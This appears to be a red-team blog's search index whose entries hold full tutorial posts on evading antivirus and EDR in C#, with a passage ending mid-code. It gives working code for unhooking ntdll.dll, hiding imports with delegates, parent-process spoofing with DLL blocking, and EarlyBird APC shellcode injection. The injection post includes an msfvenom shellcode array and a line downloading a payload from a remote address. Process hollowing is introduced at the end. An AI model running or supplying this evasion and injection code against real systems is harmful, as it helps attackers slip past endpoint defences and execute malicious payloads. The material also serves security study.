(Avoiding PInvoke &amp; API Hooks) - TheWover Dynamic Invocation in .NET to bypass hooks - NVISO Labs Syscalls with D/Invoke - Rasta Mouse A tale of EDR bypass methods - s3cur3th1ssh1t Dynamic API Invocation Calling Syscalls Directly from Visual Studio to Bypass AVs/EDRs - IRedTeam AV/EDR Evasion Using Direct System Calls (User-Mode vs kernel-Mode) - Usman Sikander Bypassing Antivirus using Direct System Calls - nag0mez" }, { "title": "Staying Under the Radar - Part 3 - Unhooking DLLs", "url": "/posts/Staying-under-the-Radar-Part-3/", "categories": "", "tags": "Red Team", "date": "2022-09-24 00:00:00 +0500", "snippet": "IntroductionIn this post we will look into how we can manually unhook DLLs that are attached by the EDRs. We can do this by swiping out the hooked version of ntdll.dll, the DLL to which all the function calls are eventually passed on before the syscall is made, with a new clean version.Endpoint Detection and ResponseEDRs or Endpoint Detection and Response are security solutions that organizations deploy to protect their infrastructure from malicious attacks by detecting them and responding to them. According to CrowdStrike, Using EDR, the threat hunters work proactively to hunt, investigate and advise on threat activity in your environment. When they find a threat, they work alongside your team to triage, investigate and remediate the incident, before it has the chance to become a full-blown breach.Userland HooksA usual way EDRs detect behaviour of a program is by the process of hooking. What this means is that the EDRs will inject into a running process and monitor the use of API calls. Some of these API calls are considered malicious due to high usage of them in malicious programs. They can be VirtualAlloc, QueueUserAPC, CreateRemoteThread, etc.An example of this has previously been discussed in Part 1 where we saw how BitDefender hooked into our process to look for malicious activity.Identifying HooksWe can identify hooks if we follow execution of a process in a debugger. For this demonstration, I’m using x64Dbg. Once we load a program in the debugger we can go over to symbols and look for ntdll.dll. Clicking on it should give us a list of exports it has. This will contain a list of APIs that we can look.In this demonstration I will be using NtCreateProcess. We can find it in the list and then double click it to see it in disassembler. We can observe a JMP instruction happening. That JMP instruction would take us the the DLL of BitDefender.In comparison, if we look at this the same way from a machine that does not have BitDefender we see that the JMP instruction is not present anymore.UnhookingImportsWe can start with importing some API calls that we would need to do this. There’s a number of API calls all mentioned below and taken from Microsoft Docs and PInvoke.[DllImport(\"psapi.dll\", SetLastError = true)]public static extern bool GetModuleInformation(IntPtr hProcess, IntPtr hModule, out MODULEINFO lpmodinfo, uint cb);[DllImport(\"kernel32.dll\", SetLastError = true)]public static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetCurrentProcess();[DllImport(\"kernel32.dll\", CharSet = CharSet.Auto)]public static extern IntPtr GetModuleHandle(string lpModuleName);[DllImport(\"kernel32.dll\", SetLastError = true, CharSet = CharSet.Auto)]public static extern IntPtr CreateFileMapping(IntPtr hFile, IntPtr lpFileMappingAttributes, PageProtection flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, string lpName);[DllImport(\"kernel32.dll\")]public static extern IntPtr MapViewOfFile(IntPtr hFileMappingObject, FileMapAccessType dwDesiredAccess, UInt32 dwFileOffsetHigh, UInt32 dwFileOffsetLow, IntPtr dwNumberOfBytesToMap);[DllImport(\"kernel32.dll\")]public static extern int VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);[DllImport(\"msvcrt.dll\", SetLastError = false)]public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UInt32 count);[DllImport(\"kernel32.dll\", SetLastError = true)]public static extern bool CloseHandle(IntPtr hObject);[DllImport(\"kernel32.dll\", SetLastError = true)]public static extern bool FreeLibrary(IntPtr hModule);We also need some structs but instead of pasting all of them here you can visit the github here to look at all the code.Main MethodFirst we need to get the current process’s handle. We can get that using GetCurrentProcess API.IntPtr currentProcessHandle = GetCurrentProcess();Then we can initialize MODULEINFO. We need to get a handle to the NTDLL.dll that is currently loaded and is being hooked by BitDefender. We can use GetModuleHhandle for this. Next we need to use GetModuleInformation with the current process handle and the DLL Handle to retrieve the information from MODULEINFO struct. This information will be lpBaseOfDll to get the base address of NTDLL.dllMODULEINFO modInfo = new MODULEINFO();IntPtr dllHandle = GetModuleHandle(\"ntdll.dll\");GetModuleInformation(currentProcessHandle, dllHandle, out modInfo, (uint)Marshal.SizeOf(modInfo));IntPtr dllBase = modInfo.lpBaseOfDll;After this we can start mapping a fresh copy of NTDLL.dll from disk. First we will get a handle of the fresh NTDLL.dll using CreateFileA with read access. Next we are going to use CreateFileMapping to create mapping of the specified DLL. Then we can map the DLL into memory using MapViewOfFile providing it the mapping and opening it with read access.string fileName = \"C:\\\\Windows\\\\System32\\\\ntdll.dll\";IntPtr ntdllHandle = CreateFileA(ntdll, GENERIC_READ, FILE_SHARE_READ, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);IntPtr ntdllMapping = CreateFileMapping(ntdllHandle, IntPtr.Zero, PageProtection.Readonly | PageProtection.SectionImage, 0, 0, null);IntPtr ntdllMmapped = MapViewOfFile(ntdllMapping, FileMapAccessType.Read, 0, 0, IntPtr.Zero);Next we get a pointer to the DOS Header from the DLL Base Address using Marshal.PtrToStructure. We can get a pointer to the NT Header structure by adding the Base Address of the DLL to e_lfanew which is a pointer to PE Header.IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(dllBase, typeof(IMAGE_DOS_HEADER));IntPtr ptrtoNTHeader = (dllBase + dosHeader.e_lfanew);IMAGE_NT_HEADERS64 ntHeader = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ptrtoNTHeader, typeof(IMAGE_NT_HEADERS64));After getting these values we can now check the sections. The section that we are interested in is the .text section because thats the one that holds all the executeable code. This also where our DLL will reside. So to overwrite the old DLL with our new DLL we are going to loop through the section names and try to find the .text one.The number of sections are retrieved by using ntHeader.FileHeader.NumberOfSections. We need to locate the Section Header so we can retreive the names of the sections. We need to loop through all the sections and get a pointer to the Section Header. That way we can easily call the name of the sections using sectionHeader.Name.for (int i = 0; i &lt; ntHeader.FileHeader.NumberOfSections; i++){ IntPtr ptrtoSectionHeader = (ptrtoNTHeader + Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64))); IMAGE_SECTION_HEADER sectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure((ptrtoSectionHeader + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)))), typeof(IMAGE_SECTION_HEADER)); string sectionName = new string(sectionHeader.Name); Console.WriteLine(sectionName);}Now we need to use a for loop as if the section name contains .text, we can proceed with the code. We start by using IntPtr.Add to add the offset of the first byte of the section to the DLL Base Address. This will be the old hooked DLL address. Then we are going to do the same with the new DLL that we have mapped as well.After this the actual change happens. We are going to use VirtualProtect to change the protection of the .text section to RWX. Then we use memcpy to overwrite the old DLL with the new one. And then change the protection back.if (sectionName.Contains(\".text\")){ uint oldProtect = 0; IntPtr oldAddress = IntPtr.Add(dllBase, (int)sectionHeader.VirtualAddress); IntPtr newAddress = IntPtr.Add(ntdllMmapped, (int)sectionHeader.VirtualAddress); int vProtect = VirtualProtect(oldAddress, sectionHeader.VirtualSize, 0x40, out oldProtect); memcpy(oldAddress, newAddress, sectionHeader.VirtualSize); vProtect = VirtualProtect(oldAddress, sectionHeader.VirtualSize, oldProtect, out oldProtect);}When this is done, the function should be able to swipe the hooked DLL with a new fresh one which is not hooked.CodeThe code can be found on my github here.ConclusionAs always this code is not perfect. EDRs or AVs might catch and burn this as soon as it hits the disk. EDRs and AVs are constantly updating and getting better at what they do so as everyone always says Its just a game of cat and mouse.ReferencesAll credits to these posts and codes DLL Unhooking C# - MakosecBlog Full DLL Unhooking - Kara-4search SharpUnhooker - GetRektBoy724 Classic API Unhooking to Bypass EDR Solutions - DepthSecurity" }, { "title": "Staying Under the Radar - Part 2 - Hiding IAT using Delegates", "url": "/posts/Staying-under-the-Radar-Part-2/", "categories": "", "tags": "Red Team", "date": "2022-09-20 00:00:00 +0500", "snippet": "IntroductionIn this post we are going to loo kat another technique we can use in C# that can help us keep our imports hidden and the Import Address Table (IAT) clean. This is done by the use of delegates. This is not a technique you can use in mature environments and expect to get is past AVs/EDRs because they are quite smart. But still its a nice technique to know of and may confuse some defenders.DelegatesAccording to the Microsoft Docs, A delegate is a type that represents references to methods with a particular parameter list and return type. When you instantiate a delegate, you can associate its instance with any method with a compatible signature and return type. You can invoke (or call) the method through the delegate instance. Delegates are used to pass methods as arguments to other methods. Event handlers are nothing more than methods that are invoked through delegates. You create a custom method, and a class such as a windows control can call your method when a certain event occurs. We are going to use these delegates to create a reference of our API call with required parameters. And then use Marshal.GetDelegateForFunctionPointer to convert an unmanaged function pointer to our delegate.ImportsWe need two APIs for this to work. GetModuleHandleA and GetProcAddress. The first one would be used to provide a handle to the DLL which we are getting the export from and then the other is used to specify the API to retreive from the the DLL.[DllImport(\"kernel32\")]public static extern IntPtr GetModuleHandleA(string lpModuleName);[DllImport(\"kernel32\")]public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);After this we need to create a delegate for our function API call. We can call it whatever we like. The parameters taht we are providing should be similar to the API call. For this POC I’m going to use a simple MessageBox.public delegate int box(IntPtr hWnd, string lpText, string lpCaption, uint uType);Main MethodWith that set up we can use GetModuleHandleA and provide the module we are calling our API from. For MessageBoxA function. it’s going to be user32.dll. The exports of this DLL can be parsed and used by GetProcAddress after providing it with the handle and the API we need.IntPtr handle = GetModuleHandleA(\"user32.dll\");IntPtr messageboxaddr = GetProcAddress(handle, \"MessageBoxA\");Lastly we going to use Marshal.GetDelegateForFunctionPointer to convert the funtion pointer messageboxaddr to the type of our box delegate.box message = (box)Marshal.GetDelegateForFunctionPointer(messageboxaddr, typeof(box));Then we can call the API as we normaly would but using the delegate.message(IntPtr.Zero, \"hey\", \"yoooo\", 0);TestingWe can test our code with comparison to a simple message box using the MessageBoxA call in PE Studio.We can see the Import being made clearly.But with delegates we only see the two API calls of GetModuleHandleA and GetProcAddress." }, { "title": "Staying Under the Radar - Part 1 - PPID Spoofing and Blocking DLLs", "url": "/posts/Staying-under-the-Radar/", "categories": "", "tags": "Red Team", "date": "2022-09-18 00:00:00 +0500", "snippet": "IntroductionIn this post we are going to look at two “features” (lol) that Microsoft provided which can allow us to spoof our parent process ID and also block third party DLLs that are not Microsoft signed. These DLLs can be EDR DLLs that add hooks in our not so safe tools.PPID SpoofingPPID Spoofing or Parent Process ID Spoofing is a technique adversaries use to evade detections based on parent-child relationships. This method makes the process look like its being spawned under a different parent process than actual parent proces.Blocking DLLSBlocking third party DLLs is another method used by attackers. This method allows the attacker to specify that any non Microsoft DLL can not inject into a process. This can help evade some AVs/EDRs that rely on hooking into processes.UpdateProcThreadAttributeThe API that allows us to do it is UpdateProcThreadAttribute. Basically InitializeProcThreadAttributeList and UpdateProcThreadAttribute. The first one allows us to initialize the attributes we need and then we can update or push them using the second one. It’ll make more sense soon.I’m using the same Process Injection from here in this. Most of the code and imports are the same so I’m not going to talk about them again. Please read the previous post or look at the code to understand that part.ImportsFirst we need to add the imports we need. The new APIs we need from the already present one in the EarlyBird POC are the ones mentioned below. The CreateProcess is the same with one difference. Instead of STARTUPINFO struct we are going to use STARTUOINFOEX struct. This is used to specify the attributes we are going to use with CreateProcess. We are going to use OpenProcess to get a process handle for the parent process we are specifying. Next we are going to use InitializeProcThreadAttributeList to initialize the attributes that we need. And then update them using UpdateProcThreadAttribute.[DllImport(\"kernel32.dll\")]public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);[DllImport(\"kernel32.dll\")]public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);[DllImport(\"kernel32.dll\")]public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);We also need the STARTUOINFOEX struct and some other constant values. These are taken from PInvoke website. The constants are from the Microsoft Docs.// https://pinvoke.net/default.aspx/Structures/STARTUPINFOEX.html[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]public struct STARTUPINFOEX{ public STARTUPINFO StartupInfo; public IntPtr lpAttributeList;}// https://pinvoke.net/default.aspx/kernel32/OpenProcess.html[Flags]public enum ProcessAccessFlags : uint{ All = 0x001F0FFF, CreateProcess = 0x000000080}public const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;public const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;public const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;public static class CreationFlags{ public const uint SUSPENDED = 0x4; public const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;}All the remaining ones like PROCESS_INFORMATION etc. are going to be the same.Main MethodFirst up we need to initialize the STARTUOINFOEX and PROCESS_INFORMATION structs.STARTUPINFOEX siex = new STARTUPINFOEX();PROCESS_INFORMATION pi = new PROCESS_INFORMATION();Then we can look for the target parent process whose ID we are going to give to our malicious program. I’m using explorer but you can use whatever process you want. Make sure that process is already running.var process = Process.GetProcessesByName(\"explorer\");int parentProc = 0;foreach (var p in process){ parentProc += p.Id;}Console.WriteLine(\"[*] New Parent PID Found: {0}\", parentProc);After we successfully get our parent PID, we can use OpenProcess to get a handle to it.IntPtr procHandle = OpenProcess(ProcessAccessFlags.CreateProcess, false, parentProc);Now we can use InitializeProcThreadAttributeList to initialize the specified list of attributes for process and thread creation. We need to specify dwAttributeCount as 2. One for parent process ID and the other to specify mitigation policy. The other thing we need is the lpAttributeList. As the docs on Microsoft say, this parameter can be null to determine the buffer size required to support the specified number of attributes. We are going to determine to buffer size using Marshal.AllocHGlobal and providing it IntPtr.Size which is 8 for x64 process and 4 for x86 process. As we are targeting x64 specifically this would be 8. We are going to provide this value to STARTUOINFOEX.lpAttributeList struct. And then use the same InitializeProcThreadAttributeList call.IntPtr lpSize = IntPtr.Zero;InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);siex.lpAttributeList = Marshal.AllocHGlobal(IntPtr.Size);InitializeProcThreadAttributeList(siex.lpAttributeList, 2, 0, ref lpSize);Similarly, we can do this with lpValueProc which we need to give to UpdateProcThreadAttribute. We also need to use Marshal.WriteIntPtr to write the parent process handle to lpValueProc. This will give us a pointer to the attribute value which we can use.Now we can use UpdateProcThreadAttribute with providing the attribute list from STARTUOINFOEX, the dwFlags is reserved so its going to be zero. Then we are going to provide our attribute that we want to update. First its going to be PROC_THREAD_ATTRIBUTE_PARENT_PROCESS whose value we already have added in our imports. Next we can provide the pointer to attribute value. The cbSize is going to be the size that was specified in the lpValueProc, IntPtr.Size which would be 8. THe other two are reserved and need to be null.IntPtr lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);Marshal.WriteIntPtr(lpValueProc, procHandle);UpdateProcThreadAttribute(siex.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, lpValueProc, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);Once that is done, our PPID Spoofing should work. We can use the same process for blocking non Microsoft DLLs as well. The attribute is going to be PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY and the value lpMitigationPolicy we are providing would be PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON which specifies that only Microsoft signed DLLs should be injected in the process.IntPtr lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);Marshal.WriteInt64(lpMitigationPolicy, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);UpdateProcThreadAttribute(siex.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, lpMitigationPolicy, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);If that works, when you use CreateProcess to create a process, it should have the parent process ID as the one we specified and the mitigation policy should also be applied. The only change that is needed is that with the suspended flag like we have in our process injection we also need to specify EXTENDED_STARTUPINFO_PRESENT and the reference that used to be to STARTUPINFO is now going to be STARTUOINFOEX which we specified as siex. I added a Console.ReadKey() which would pause the process so we can check if the attributes work. We also need to add the rest of the code from the process injection after this.string app = @\"C:\\Windows\\System32\\svchost.exe\";bool procinit = CreateProcess(app, null, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED | CreationFlags.EXTENDED_STARTUPINFO_PRESENT, IntPtr.Zero, null, ref siex, ref pi);Console.WriteLine(\"[*] Process Created. Process ID: {0}\", pi.dwProcessId);Console.ReadKey();We can first check a normal program to see if attributes are present or if the AV DLL is injected or not. For this demo I’m using BitDefender’s free version and I’m using Process Hacker 2 to check the process.We can see that the process is a child process of explorer which is normal. We can also see that there is not mitigation policy which is why the atcuf64.dll DLL by BitDefender is injected into the process.But when we use our tool which starts svchost as a suspended process, we can see that it appears to be a child process of notepad which it definitely is not. We can also see the mitigation policy that mentions Microsoft Only, using which we have no BitDefender injected DLLs.CodeThe full code can be found on my github here. There are still a few changes and features I want to add in it but it still works. Make sure to compile it for x64.ConslusionIts a nice trick to confuse defenders but I should mention, AVs and EDRs are smart now so this probably will not be enough for you to get past. It did get flagged as malicious by BitDefender as well. There’s a lot of other things we can do to make sure it works which would be discussed later.ReferencesCredits to all of these posts and publicaly available tools Preventing 3rd Party DLLs from Injecting into your Malware - IRed.Team D/Invokify PPID Spoofy &amp; BlockDLLs - RastaMouse Parent PID Spoofing Covenant Task 101 - PPID Spoof Example Less Detectable with PPID Spoofing PPID Spoof &amp; BlockDLLs - RastaMouse ProcessInjection - 3xpl01tc0d3r Alternative methods of becoming SYSTEM - XPN CSharp - leoloobeek Defcon27 CSharp Workshop - mvelazc0" }, { "title": "Shellcode Injection in C# - Part 3 - QueueUserAPC | EarlyBird", "url": "/posts/Shellcode-Injection-Techniques-Part-3/", "categories": "", "tags": "Red Team", "date": "2022-09-16 00:00:00 +0500", "snippet": "IntroductionIn this post we are going to look at another method for shellcode execution. THis involves using the API call QueueUserAPC. Like previous Process Hollowing, in this we are going to open a process in a suspended state, allocate some memory into it, write our shellcode into that allocated region, queue and APC to the thread and then resume it.QueueUserAPCAccording to Mitre APC injection is commonly performed by attaching malicious code to the APC Queue of a process’s thread. Queued APC functions are executed when the thread enters an alterable state. A handle to an existing victim process is first created with native Windows API calls such as OpenThread. At this point QueueUserAPC can be used to invoke a function.APC stands for Asynchronous Procedure Call. APCs are functions that executes asynchronously in the context of a particular thread. Every thread has its own queue of APCs. They are executed in FIFO (First in first out) way when a thread enters an alertable state. A thread can enter an alertable state using calls like SleepEx. Explained by Microsoft hereEarlyBirdIn standard QueueUserAPC injection, all the threads are opened of a running process and the shellcode is binded with them in search that one of them will have a alertable state for it to execute our shellcode. This is unpredictable as it may not execute our shellcode or it may execute our shellcode multiple times.In comes EarlyBird method. In this method, instead of targeting a running process we chose to create a process in a suspended state. After writing our shellcode to the thread we queue an APC and then resume the thread. This way the program processes the APC before the main thread executes. In some cases, it can bypass some EDRs/AVs because the execution of our shellcode happens before EDRs can hook in. (More into this later)..NET and APCsWhile looking at some POCs of this method in C#, I noticed the code didnt have any “Alertable State” calls to actually execute the shellcode. Some research lead me to two articles. One by SpecterOps and the other by wireless90. They explain how the CLR in .NET is responsible for this to happen.TLDR is that the CLR calls an alertable method for us. The thread would be managed by the CLR and the shellcode executes when the .NET executeable exits.ImportsWith all that theory out we can start with developing. First we need to set up the API calls we are going to use. For this some of the calls are obvious. First we need to create a process in a suspended state with CreateProcess. Then we allocate some RW space for our shellcode using VirtualAllocEx. Then we write the shellcode using WriteProcessMemory. Change the protection to RX USING VirtualProtectEx. Queue an APC to the main thread and then resume the thread. All put together looks like this.[DllImport(\"kernel32.dll\")]public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);[DllImport(\"kernel32.dll\")]public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtectEx(IntPtr handle, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);[DllImport(\"kernel32.dll\")]public static extern uint ResumeThread(IntPtr hThread);We also need some structs like in the previous post.public struct STARTUPINFO{ public Int32 cb; public string lpReserved; public string lpDesktop; public string lpTitle; public Int32 dwX; public Int32 dwY; public Int32 dwXSize; public Int32 dwYSize; public Int32 dwXCountChars; public Int32 dwYCountChars; public Int32 dwFillAttribute; public Int32 dwFlags; public Int16 wShowWindow; public Int16 cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;}[StructLayout(LayoutKind.Sequential)]public struct PROCESS_INFORMATION{ public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId;}public static class CreationFlags{ public const uint SUSPENDED = 0x4;}public enum ThreadAccess : int{ SET_CONTEXT = 0x0010}public static readonly UInt32 MEM_COMMIT = 0x1000;public static readonly UInt32 MEM_RESERVE = 0x2000;public static readonly UInt32 PAGE_EXECUTE_READ = 0x20;public static readonly UInt32 PAGE_READWRITE = 0x04;Main MethodFirst we need to initialize a couple of structs and then we can create a process in a suspended state much like in the previous post.STARTUPINFO si = new STARTUPINFO();PROCESS_INFORMATION pi = new PROCESS_INFORMATION();string app = @\"C:\\Windows\\System32\\svchost.exe\";bool procinit = CreateProcess(null, app, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED, IntPtr.Zero, null, ref si, ref pi);We can add our shellcode in. We have seen how to copy paste from msfvenom. We can also fetch the shellcode from web or read from disk. Not recommended reading shellcode from disk. Very bad OPSEC.// If you want to fetch the shellcode from the webstring url = \"http://192.168.1.1/safe.bin\";WebClient wc = new WebClient();byte[] buf = wc.DownloadData(url);// If you want to load shellcode from diskstring shellpath = @\"C:\\Users\\crypt0ace\\Desktop\\www\\safe.bin\";byte[] buf = File.ReadAllBytes(shellpath);// If you want to embed the shellcode// msfvenom -p windows/x64/exec CMD=calc.exe -f csharpbyte[] buf = new byte[276] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52, 0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48, 0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9, 0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41, 0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48, 0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01, 0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48, 0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0, 0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c, 0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0, 0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04, 0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59, 0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48, 0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f, 0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff, 0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb, 0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c, 0x63,0x2e,0x65,0x78,0x65,0x00 };Make sure to comment out the method youre not using.After starting the process we can allocate space for our shellcode. This time however we would be using READ/WRITE (RW) memory and not READ/WRITE/EXECUTE (RWX) because it creates more suspicion and is usually flagged by AVs.IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);Once the memory has been allocated we can write our shellcode in it using WriteProcessMemory.IntPtr bytesWritten = IntPtr.Zero;bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, buf, buf.Length, ref bytesWritten);We can now change the memory protection using VirtualProtectEx to READ/EXECUTE (RX)uint oldProtect = 0;IntPtr proc_handle = pi.hProcess;resultBool = VirtualProtectEx(proc_handle, resultPtr, buf.Length, PAGE_EXECUTE_READ, out oldProtect);After that we can use QueueUserAPC to queue and APC to our thread. We will provide the main thread using the PROCESS_INFORMATION struct’s hThread.IntPtr ptr = QueueUserAPC(resultPtr, pi.hThread, IntPtr.Zero);Resuming the thread using ResumeThread would put our APC to the front and execute the code in it before the main thread gets executed.IntPtr ThreadHandle = pi.hThread;ResumeThread(ThreadHandle);All goes well you should see the shellcode being executed.CodeThe full code can be found on my github here. Wont bypass any AV/EDR though but its a nice little technique for shellcode execution.ReferencesAs always all credits to these great posts IRed.Team Mitre Kara-4search/EarlyBirdInjection_CSharp SevroSecurity dosxuz/Process-Injections 3xpl01tc0d3r - Process Injections Part 5 0x00sec - Process Injection: APC Injection wireless90 - Stealthy Code Injection in a Running .NET Process Dwight Hohnstein - The Curious Case of QueueUserAPC" }, { "title": "Shellcode Injection in C# - Part 2 - Process Hollowing", "url": "/posts/Shellcode-Injection-Techniques-Part-2/", "categories": "", "tags": "Red Team", "date": "2022-09-09 00:00:00 +0500", "snippet": "IntroductionThis post is part 2 of shellcode injection techniques. You can read part 1 here. In this one, we will look into Process Hollowing in C#.Process HollowingProcess Hollowing is a technique in which we use a legitimate process, inject it with our shellcode and make the process run our shellcode. According to Mitre Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.Nice. We know what imports we have to make. The flow chart of API calls will go like thisSo we will be first creating a process in a suspended state using CreateProcess, query the process using ZwQueryInformationProcess, get some values using ReadProcessMemory, write our shellcode using WriteProcessMemory and then resume the thread using ResumeThread.ImportsWe can start writing the code with these API imports. Using the Windows Docs and the calls we need, we get the imports as[DllImport(\"kernel32.dll\")]public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, ref IntPtr lpNumberOfBytesWritten);[DllImport(\"kernel32.dll\", SetLastError = true)]public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);[DllImport(\"kernel32.dll\")]public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);[DllImport(\"ntdll.dll\")]public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);[DllImport(\"kernel32.dll\", SetLastError = true)]public static extern uint ResumeThread(IntPtr hThread);Pretty self explanatory. Look at my previous posts if this confuses you.We also need some structs and enums for this to work. These are STARTUPINFO, PROCESS_INFORMATION and PROCESS_BASIC_INFORMATION. These stucts, in the C# format can be found at Pinvoke website. We also have the SUSPENDED state which we will provide as a creation flag to CreateProcess to create a process in a suspended state. All combined these become[StructLayout(LayoutKind.Sequential)]internal struct PROCESS_BASIC_INFORMATION{ public IntPtr ExitStatus; public IntPtr PebAddress; public IntPtr AffinityMask; public IntPtr BasePriority; public IntPtr UniquePID; public IntPtr InheritedFromUniqueProcessId;}[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]public struct 